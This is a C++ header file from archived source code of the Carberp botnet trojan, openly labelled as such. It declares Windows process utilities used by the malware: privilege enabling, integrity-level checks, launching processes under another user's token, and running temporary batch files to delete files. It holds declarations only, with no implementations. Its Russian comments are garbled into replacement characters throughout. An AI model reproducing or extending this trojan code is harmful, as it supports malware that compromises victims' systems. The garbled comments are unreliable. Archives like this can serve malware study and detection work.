/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*
  ������ � ����������.
*/
#pragma once

//ID �������� ��������.
#define CURRENT_PROCESS ((HANDLE)-1)

namespace Process
{
  //������� ����������.
  enum
  {
    INTEGRITY_UNKNOWN,
    INTEGRITY_LOW,     //Untrusted (Process can only write to low integrity locations, such as the Temporary Internet Files\Low folder or the HKEY_CURRENT_USER\Software\LowRegistry key)
    INTEGRITY_MEDIUM,  //User (Process can create and modify files in the user's Documents folder and write to user-specific areas of the registry, such as HKEY_CURRENT_USER.)
    INTEGRITY_HIGH     //Administrative (Process can install files to the Program Files folder and write to sensitive registry areas like HKEY_LOCAL_MACHINE.)
  };
  
  //����� ��� showShellRunDialog().
  enum
  {
    RFD_NOBROWSE        = 0x00000001, //�� ���������� ������ "�����".
    RFD_NODEFFILE       = 0x00000002, //�� �������� ���� �� ���������.
    RFD_USEFULLPATHDIR  = 0x00000004, //������������� ������� ���������� �� ���� ������������ ����� (������������ ��� workingDir != NULL).
    RFD_NOSHOWOPEN      = 0x00000008  //�� ���������� ����� ��� Edit'�.
  };

  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ������ ������ � ��������.

    IN process    - �������. ����� ����� PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
    IN moduleName - ��� ������ ��� ������. ������ ���� ��� ������� ������, ��� � ������.

    Return        - ����� ������, ��� NULL ���� �� ������.
  */
  HMODULE _getModuleHandle(HANDLE process, LPWSTR moduleName);

  /*
    ��������� SID ��� ��������.

    IN process    - ����� �������� � ������� PROCESS_QUERY_INFORMATION.
    OUT sessionId - ID ������, ��� NULL ���� ��� �� �����.
    
    Return        - ������ SID (���������� ���������� ����� Mem), ��� NULL � ������ ������.
  */
  TOKEN_USER *_getUserByProcessHandle(HANDLE process, LPDWORD sessionId);

  /*
    ��������� SID ��� ��������.

    IN id         - ID ��������.
    OUT sessionId - ID ������, ��� NULL ���� ��� �� �����.

    Return        - ������ SID (���������� ���������� ����� Mem), ��� NULL � ������ ������.
  */
  TOKEN_USER *_getUserByProcessId(DWORD id, LPDWORD sessionId);

  /*
    ��������� ���. ������� � ��������.

    IN id  - ID ��������.
    
    Return - ���. �������, ��� (DWORD)-1 � ������ ������.
  */
  DWORD _getCountOfThreadsByProcessId(DWORD id);

  /*
    ��������� ���������� ��� �������� ������ ��� �������� (��� �������).

    IN privilegeName - ��� ����������.
    IN enable        - true - ��������, false - ���������.

    Return           - true - � ������ ��������� ��������� ����������,
                       false - � ������ ������, ��� ���� ���������� ��� ����� ��������� ������.
  */
  bool _enablePrivilege(LPWSTR privilegeName, bool enable);

  /*
    ��������� ������ �������.

    IN procrss - ����� �������� (����� ����� PROCESS_QUERY_INFORMATION), ��� -1 ���
                 �������� ��������.

    Return     - INTEGRITY_*.
  */
  BYTE _getIntegrityLevel(HANDLE process);

  /*
    ���������, ���������� �� ������� ��� WOW64.

    IN process - ������� � ������ PROCESS_QUERY_INFORMATION ��� PROCESS_QUERY_LIMITED_INFORMATION.

    Return     - true - ������� ��� WOW64,
                 false - ������� �� ��� WOW64.
  */
#if !defined _WIN64
  bool _isWow64(HANDLE process);
#endif

  /*
    �������� ������ ��������.

    IN module      - ��� ������, ����� ���� NULL.
    IN commandLine - ��������� ������, ����� ���� NULL. ��������� ����� �� ����� ���� ����������!
    IN workDir     - ������� ���������� ����� ��������, ����� ���� NULL.
    IN starupInfo  - STARTUPINFO, ����� ���� NULL.
    OUT pi         - PROCESS_INFORMATION, ����� ���� NULL.

    Return         - ID �������� - � ������ ������,
                     0 - � ������ ������.
  */
  DWORD _create(const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi);

  /*
    ���������� ��� _create(), ������ ������� ������� � ��������� �������, ��� ������ �������� ���
    ������. �.�. � ����� ����� ������������ ����� ������� ���������, ������������� ������������
    ������ ��� ������� ������ _create(), ��� ������� � �������� �������� �������, ������� ������
    ���� � ������ ��������� ��� ��������.

    IN module      - ��� ������, �� ����� ���� NULL.
    IN commandLine - ��������� ������, ����� ���� NULL.
    IN workDir     - ������� ���������� ����� ��������, ����� ���� NULL.
    IN starupInfo  - STARTUPINFO, ����� ���� NULL.
    OUT pi         - PROCESS_INFORMATION, ����� ���� NULL.

    Return         - ID �������� - � ������ ������,
                     0 - � ������ ������.
  */
  DWORD _createEx(const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo,  PROCESS_INFORMATION *pi);


  /*
    �������� ������ ��������.

    IN token       - ��������� ����� ������������, ��� �������� ��������� �������. ����� �����:
                     TOKEN_QUERY, TOKEN_DUPLICATE, TOKEN_ASSIGN_PRIMARY.
    IN desktop     - ������� � ������� "��������\�������". ����� ���� NULL. �� ����� ������, ����
                     starupInfo != NULL.
    IN module      - ��� ������, ����� ���� NULL.
    IN commandLine - ��������� ������, ����� ���� NULL. ��������� ����� �� ����� ���� ����������!
    IN workDir     - ������� ���������� ����� ��������, ����� ���� NULL.
    IN starupInfo  - STARTUPINFO, ����� ���� NULL.
    OUT pi         - PROCESS_INFORMATION, ����� ���� NULL.

    Return         - ID �������� - � ������ ������,
                     0 - � ������ ������.
  */
  DWORD _createAsUser(HANDLE token, const LPWSTR desktop, const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi);

  /*
    ���������� ��� _createAsUser(), ������ ������� ������� � ��������� �������, ��� ������ �������� ���
    ������. �.�. � ����� ����� ������������ ����� ������� ���������, ������������� ������������
    ������ ��� ������� ������ _createAsUser(), ��� ������� � �������� �������� �������, ������� ������
    ���� � ������ ��������� ��� ��������.

    IN token       - ��������� ����� ������������, ��� �������� ��������� �������. ����� �����:
                     TOKEN_QUERY, TOKEN_DUPLICATE, TOKEN_ASSIGN_PRIMARY.
    IN desktop     - ������� � ������� "��������\�������". ����� ���� NULL. �� ����� ������, ����
                     starupInfo != NULL.
    IN module      - ��� ������, �� ����� ���� NULL.
    IN commandLine - ��������� ������, ����� ���� NULL.
    IN workDir     - ������� ���������� ����� ��������, ����� ���� NULL.
    IN starupInfo  - STARTUPINFO, ����� ���� NULL.
    OUT pi         - PROCESS_INFORMATION, ����� ���� NULL.

    Return         - ID �������� - � ������ ������,
                     0 - � ������ ������.
  */
  DWORD _createAsUserEx(HANDLE token, const LPWSTR desktop, const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi);

  /*
    �������� ������� � ��������� PROCESS_INFORMATION.

    IN OUT pi - PROCESS_INFORMATION.
  */
  void _closeProcessInformation(PROCESS_INFORMATION *pi);
  
  /*
    ��������� ��� CreateThread().

    IN stackSize    - ������ �����.
    IN startAddress - ����� �����. 
    IN parameter    - ��������.

    Return          - ID ������, ��� 0 � ������ ������.
  */
  DWORD _createThread(SIZE_T stackSize, LPTHREAD_START_ROUTINE startAddress, LPVOID parameter);

  /*
    ����� ������������ �������� ������� (RunFileDlg).

    IN owner      - ��������, ����� ���� NULL.
    IN workingDir - ������� ����������, ����� ���� NULL.
    IN title      - ��������� �������, ����� ���� NULL ��� �������� �� ���������.
    IN promt      - ����� �������, ����� ���� NULL ��� �������� �� ���������.
    IN flags      - ����� RFD_*.
  */
  void _showShellRunDialog(HWND owner, const LPWSTR workingDir, const LPWSTR title, const LPWSTR promt, DWORD flags);

  /*
    �������� ����� ����� ������.

    IN fileForRemoving - ������ ��� ����� ��� ��������.

    Return             - true - � ������ ������,
                         false - � ������ ������.
  */
  bool _runBatchForRemoveFile(const LPWSTR fileForRemoving);

  /*
    ������ bat-����� � ����������� ����������, � ��� ���������� ��������.

    IN context - ���������� ����� � ��������� OEM, ����� ��������� �������������� �������� �
                 ���������.
    
    Return     - true - � ������ ������,
                 false - � ������ ������.
  */
  bool _runTempBatch(const LPSTR context);
};
